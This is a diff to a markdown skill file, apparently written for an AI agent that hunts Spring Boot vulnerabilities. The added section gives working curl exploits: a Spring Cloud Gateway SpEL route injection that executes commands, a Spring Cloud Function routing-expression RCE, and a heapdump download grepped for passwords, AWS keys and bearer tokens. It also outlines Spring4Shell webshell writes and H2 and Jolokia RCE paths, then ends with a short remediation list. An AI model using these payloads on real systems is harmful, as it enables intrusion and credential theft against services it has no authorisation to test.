@@ -3,6 +3,9 @@ name: hunt-springboot
 description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
 sources: hackerone_public, cve_database, spring_security_advisories
 report_count: 16
+cwe: [CWE-200, CWE-917, CWE-502, CWE-668, CWE-918]
+cvss_baseline: "Medium (5.3) actuator info leak → High (7.5-8.6) heapdump credential extraction / env disclosure → Critical (9.8) SpEL/Spring4Shell/H2/Gateway RCE."
+related_skills: [hunt-exceptional-conditions, hunt-deserialization, hunt-rce, hunt-ssti, hunt-source-leak]
 ---
 
 # HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
@@ -225,6 +228,49 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 | Jolokia + MLet | Remote code via MBean | Critical RCE |
 
 ---
+
+## New Techniques (2024-2026)
+
+### Spring Cloud Gateway SpEL RCE — CVE-2022-22947
+If `/actuator/gateway` is exposed, add a route whose filter contains a SpEL payload, then refresh to execute:
+```bash
+# 1) create a malicious route with a SpEL-in-filter
+curl -s -X POST "https://$T/actuator/gateway/routes/hack" -H 'Content-Type: application/json' -d '{
+ "id":"hack","filters":[{"name":"AddResponseHeader","args":{
+   "name":"Result",
+   "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
+ "uri":"http://example.com","order":0}'
+# 2) apply, 3) trigger, 4) read the Result header, 5) clean up the route
+curl -s -X POST "https://$T/actuator/gateway/refresh"
+curl -si "https://$T/actuator/gateway/routes/hack" | grep -i Result
+```
+
+### Actuator → heapdump credential harvest (no RCE needed)
+`/actuator/heapdump` (often reachable even when `/env` is masked) is a full JVM memory image. Pull it and mine secrets:
+```bash
+curl -s "https://$T/actuator/heapdump" -o hd.hprof
+strings hd.hprof | grep -iE 'password|secret|AKIA|Bearer |jdbc:|x-api-key' | sort -u
+# deeper: Eclipse MAT OQL  SELECT * FROM java.lang.String s WHERE s.toString().contains("password")
+```
+`/actuator/env` + `/actuator/configprops` leak DSNs/keys; `/actuator/mappings` reveals the full hidden API surface; `/actuator/threaddump` leaks internal hostnames.
+
+### Env-manipulation → refresh RCE (CVE-2022-22963 Spring Cloud Function)
+```bash
+curl -s "https://$T/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' -d 'x'
+```
+Also `/actuator/env` POST to set `spring.cloud.bootstrap`/JNDI props → `logging.config=ldap://...` style loads.
+
+### Spring4Shell (CVE-2022-22965) & path traversal (CVE-2024-38819)
+Data-binding to `class.module.classLoader.*` on Tomcat → write a JSP webshell; the 2024 functional-web path-traversal reads arbitrary files on static-resource routes. Fingerprint version via Whitelabel/stack trace first.
+
+### H2 console RCE & Jolokia
+`/h2-console` with `sa`/empty → `CREATE ALIAS ... Runtime.exec`; `/actuator/jolokia` → invoke MBeans (e.g. Logback `reloadByURL` → remote config → RCE).
+
+## Remediation
+
+- Expose only `/actuator/health` and `/actuator/info`; set `management.endpoints.web.exposure.include=health,info`; bind actuator to a separate, firewalled management port; require auth on all actuator endpoints.
+- Disable `heapdump`/`env`/`gateway`/`jolokia`/`shutdown` in production; patch Spring Framework/Cloud Gateway/Cloud Function for the CVEs above; remove H2 console.
+- Never evaluate user input as SpEL; keep `spring.cloud.function` routing expressions server-fixed.
 
 ## Validation
 
